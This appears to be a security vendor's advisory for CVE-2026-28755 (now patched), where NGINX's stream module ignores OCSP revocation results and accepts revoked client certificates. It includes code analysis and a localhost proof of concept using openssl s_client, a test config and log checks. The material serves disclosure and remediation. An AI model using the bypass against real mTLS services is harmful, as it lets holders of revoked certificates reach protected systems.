---
schema_version: "1.0.0"
document_id: "d4a6ebf9f80863a5a7c01e6c8512de5969268d36e571c2a01e06a0ef9df9e846"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/CVE-2026-28755"
published_at: "2026-01-01T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T22:24:25.720028+00:00"
content_hash: "sha256:d48d6b58dd8585cbbc05428b418d92d0fb48479f949da8dcf82e57d886927588"
---

# stream accepts revoked client certificates despite ssl_ocsp on (CVE-2026-28755)

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


NGINX


Medium


CVE-2026-28755


2026


# stream accepts revoked client certificates despite ssl_ocsp on (CVE-2026-28755)


## Summary


NGINX` stream` module allows TLS handshake to succeed with revoked client certificates when` ssl_ocsp on` is configured


When a` stream` listener is configured with both` ssl_verify_client on` and` ssl_ocsp on` , nginx performs the OCSP request and learns that the presented client certificate is revoked, but it still completes the TLS handshake and allows the session to reach application data.


The root cause is a logic gap specific to` stream` : the OCSP helper records revocation state, but the` stream` verification path in` ngx_stream_ssl_handler()` checks only` SSL_get_verify_result()` and whether a certificate is present. It never calls` ngx_ssl_ocsp_get_status()` . The HTTP path does enforce the OCSP result —` ngx_http_request.c` explicitly calls` ngx_ssl_ocsp_get_status()` and rejects the request when the result is not good. The result is that OCSP executes, revocation is detected, but revocation is ignored in` stream` .


### CVSS Score


Vector


N


Complexity


L


Privileges


L


User Interaction


N


Scope


U


Confidentiality


L


Integrity


L


Availability


N


CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N


### Vulnerability Location


Source


Line 1123


src /stream


/ngx_stream_ssl_module.c


ngx_stream_ssl_merge_srv_conf (OCSP config hookup)


Sink


Line 461


src /stream


/ngx_stream_ssl_module.c


ngx_stream_ssl_handler() (missing ngx_ssl_ocsp_get_status call)


## Source-to-Sink Analysis


1


src/stream/ngx_stream_ssl_module.c:1123-1133


The` stream` configuration path enables OCSP checks through` ngx_ssl_ocsp()` when` ssl_ocsp on` is set.


CPP


```text
if   (conf->ocsp) {


if   (conf->verify ==  3  ) {
ngx_log_error  (NGX_LOG_EMERG, cf->log,  0  ,
"\"ssl_ocsp\" is incompatible with "
"\"ssl_verify_client optional_no_ca\""  );
return   NGX_CONF_ERROR;
}


if   ( ngx_ssl_ocsp  (cf, &conf->ssl, &conf->ocsp_responder, conf->ocsp,
conf->ocsp_cache_zone)
!= NGX_OK)
{
return   NGX_CONF_ERROR;
}
}


```


2


src/event/ngx_event_openssl_stapling.c:883-1001


` ngx_ssl_ocsp_validate()` performs the OCSP transaction and asynchronous state machine. It correctly receives and parses the revoked OCSP response.


CPP


```text
/* OCSP validation machinery - performs the OCSP request
* and records revocation state */


```


3


src/stream/ngx_stream_ssl_module.c:461-489


The` stream` verification path checks only` SSL_get_verify_result()` and certificate presence. It **never** calls` ngx_ssl_ocsp_get_status()` , so revocation state is ignored.


CPP


```text
if   (sscf->verify) {
rc =  SSL_get_verify_result  (c->ssl->connection);


if   (rc != X509_V_OK
&& (sscf->verify !=  3   || ! ngx_ssl_verify_error_optional  (rc)))
{
/* ... reject invalid cert ... */
return   NGX_ERROR;
}


if   (sscf->verify ==  1  ) {
cert =  SSL_get_peer_certificate  (c->ssl->connection);


if   (cert ==  NULL  ) {
/* ... reject missing cert ... */
return   NGX_ERROR;
}


X509_free  (cert);
}
/* NO ngx_ssl_ocsp_get_status() call here */
}


return   NGX_OK;


```


4


src/http/ngx_http_request.c:2142-2150


For comparison, the HTTP path **does** enforce the OCSP result by calling` ngx_ssl_ocsp_get_status()` and rejecting the request when the result is not good.


CPP


```text
if   ( ngx_ssl_ocsp_get_status  (c, &s) != NGX_OK) {
ngx_log_error  (NGX_LOG_INFO, c->log,  0  ,
"client SSL certificate verify error: %s"  , s);


ngx_ssl_remove_cached_session  (c->ssl->session_ctx,
( SSL_get0_session  (c->ssl->connection)));


ngx_http_finalize_request  (r, NGX_HTTPS_CERT_ERROR);
return  ;
}


```


## Impact Analysis


### Critical Impact


This breaks revocation enforcement for` stream` mTLS services. A revoked client certificate remains usable until the certificate itself expires or the private key becomes unavailable to the attacker. Any internal TCP service fronted by NGINX` stream` and protected with client certificates can remain reachable after revocation. Deployments that rely on OCSP revocation checks to disable compromised or deprovisioned client certificates are effectively unprotected.


### Attack Surface


Any NGINX deployment using the` stream` module with TLS client authentication (` ssl_verify_client on` ) and OCSP revocation checking (` ssl_ocsp on` ).


### Preconditions


The target uses the` stream` module with TLS client authentication enabled and` ssl_ocsp on` configured. The attacker still has the private key for a revoked client certificate. NGINX can reach an OCSP responder, either via` ssl_ocsp_responder` or certificate AIA.


## Proof of Concept


### Environment Setup


From the nginx source root, build nginx with` stream` and SSL support:


BASH


```text
./auto/configure --with-debug --with-stream \
--with-stream_ssl_module --with-http_ssl_module \
--without-http_rewrite_module --without-http_gzip_module
make -j4


```


### Target Configuration


The PoC creates a self-contained CA, server cert, client cert, OCSP responder cert, then revokes the client cert and starts an OCSP responder and nginx with this config:


NGINX


```text
worker_processes  1;
error_log $WORKDIR/logs/error.log debug;


events {
worker_connections  64;
}


stream {
server {
listen 127.0.0.1:18443 ssl;


ssl_certificate $WORKDIR/server.crt;
ssl_certificate_key $WORKDIR/server.key;


ssl_client_certificate $WORKDIR/ca/ca.crt;
ssl_verify_client on;
ssl_verify_depth 2;


ssl_ocsp on;
ssl_ocsp_responder http://127.0.0.1:19080/;


return "stream-ok\n";
}
}


```


### Exploit Delivery


After the CA and OCSP responder are set up and the client cert is revoked:


1. Verify OCSP reports the certificate as revoked:


BASH


```text
openssl ocsp \
-issuer  " $WORKDIR  /ca/ca.crt"   \
-cert  " $WORKDIR  /client.crt"   \
-url http://127.0.0.1:19080/ \
-CAfile  " $WORKDIR  /ca/ca.crt"


```


1. Connect with the revoked certificate:


BASH


```text
openssl s_client \
-connect 127.0.0.1:18443 \
-cert  " $WORKDIR  /client.crt"   \
-key  " $WORKDIR  /client.key"   \
-CAfile  " $WORKDIR  /ca/ca.crt"   \
-quiet < /dev/null


```


1. Check nginx debug log:


BASH


```text
grep -E  'ssl ocsp response|stream return text'   \
" $WORKDIR  /logs/error.log"


```


### Outcome


A revoked client certificate is accepted by the` stream` listener despite OCSP confirming revocation. The TLS handshake completes and application data (` stream-ok` ) is returned to the attacker.


**Expected Response:** The OCSP query reports the client certificate as` revoked` .` openssl s_client` still completes the handshake and prints` stream-ok` . The nginx debug log contains both:


TEXT


```text
ssl ocsp response, revoked, ...
stream return text: "stream-ok"


```


This proves nginx both recognized the revocation and still accepted the certificate in` stream` .


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/nginx/nginx/pull/1213)
